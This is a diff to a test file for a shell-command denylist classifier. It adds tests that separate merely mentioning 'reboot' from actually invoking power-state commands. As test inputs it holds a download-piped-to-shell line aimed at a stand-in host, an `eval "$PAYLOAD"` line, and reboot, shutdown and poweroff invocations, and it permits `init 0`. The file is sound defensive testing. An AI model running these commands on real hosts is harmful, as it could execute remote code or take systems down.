@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { classifyCommand, extractBinary, FORBIDDEN_PATTERNS } from '../../../src/policy/classifier.js';
+import { classifyCommand, extractBinary, isForbidden } from '../../../src/policy/classifier.js';
 
 describe('classifyCommand', () => {
   it('classifies allowlisted commands as read-only', () => {
@@ -124,7 +124,7 @@ describe('forbidden pattern matching cost', () => {
 });
 
 describe('forbidden patterns still match after the rewrite', () => {
-  const forbids = (command: string) => FORBIDDEN_PATTERNS.some((re) => re.test(command));
+  const forbids = (command: string) => isForbidden(command);
 
   it('refuses piping a download straight into a shell', () => {
     expect(forbids('curl http://x.example/i.sh | sh')).toBe(true);
@@ -151,5 +151,65 @@ describe('forbidden patterns still match after the rewrite', () => {
     expect(forbids('wget http://x.example/archive.tgz')).toBe(false);
     expect(forbids('dd if=/dev/zero of=/tmp/scratch bs=1M count=1')).toBe(false);
     expect(forbids('chown -R app:app /srv/app')).toBe(false);
+  });
+});
+
+/**
+ * Reported as #91: `/\breboot\b/` matched the word anywhere in the string, so
+ * reading a log that mentions a reboot was refused as if it caused one. The
+ * reporter hit it twice in a row on a NAS before getting anywhere.
+ *
+ * Both halves have to hold. Refusing a mention is the bug; missing an
+ * invocation would be much worse than the bug.
+ */
+describe('power-state commands: invocation versus mention', () => {
+  const forbids = (command: string) => isForbidden(command);
+
+  it('permits read-only commands that merely mention one', () => {
+    expect(forbids('last reboot')).toBe(false);
+    expect(forbids('grep -r reboot /etc/')).toBe(false);
+    expect(forbids('cat /var/run/reboot-required')).toBe(false);
+    expect(forbids('journalctl -u sshd | grep shutdown')).toBe(false);
+    expect(forbids('echo "do not reboot this host"')).toBe(false);
+    expect(forbids('ls /etc/systemd/system')).toBe(false);
+    expect(forbids('systemctl status sshd')).toBe(false);
+    // `sudo` in front of a mention is still only a mention.
+    expect(forbids('sudo grep reboot /var/log/syslog')).toBe(false);
+  });
+
+  it('still refuses actually invoking one', () => {
+    expect(forbids('reboot')).toBe(true);
+    expect(forbids('shutdown -h now')).toBe(true);
+    expect(forbids('poweroff')).toBe(true);
+    expect(forbids('halt')).toBe(true);
+    expect(forbids('sudo reboot')).toBe(true);
+    expect(forbids('/sbin/reboot')).toBe(true);
+    expect(forbids('sudo /sbin/shutdown -r now')).toBe(true);
+    expect(forbids('eval "$PAYLOAD"')).toBe(true);
+  });
+
+  it('refuses one hidden behind a separator or a privilege flag', () => {
+    expect(forbids('cd /tmp; reboot')).toBe(true);
+    expect(forbids('true && reboot')).toBe(true);
+    expect(forbids('echo x | reboot')).toBe(true);
+    // `-u root` consumes its value, so the head word is `reboot`, not `root`.
+    expect(forbids('sudo -u root reboot')).toBe(true);
+    expect(forbids('sudo -n poweroff')).toBe(true);
+  });
+
+  it('refuses a multiplexer carrying the action as an argument', () => {
+    expect(forbids('systemctl reboot')).toBe(true);
+    expect(forbids('sudo systemctl poweroff')).toBe(true);
+    expect(forbids('init 0')).toBe(false);        // a runlevel is not one of the words
+    expect(forbids('systemctl restart nginx')).toBe(false);
+  });
+
+  it('classifies a mention by what it actually is, not as destructive', () => {
+    // `last reboot` was reaching the denylist, so its class never mattered.
+    // It does now: this has to come back read-only, not destructive.
+    expect(classifyCommand('last reboot').class).not.toBe('destructive');
+    expect(classifyCommand('cat /var/run/reboot-required').class).toBe('read-only');
+    expect(classifyCommand('reboot').class).toBe('destructive');
+    expect(classifyCommand('sudo reboot').class).toBe('privileged');
   });
 });
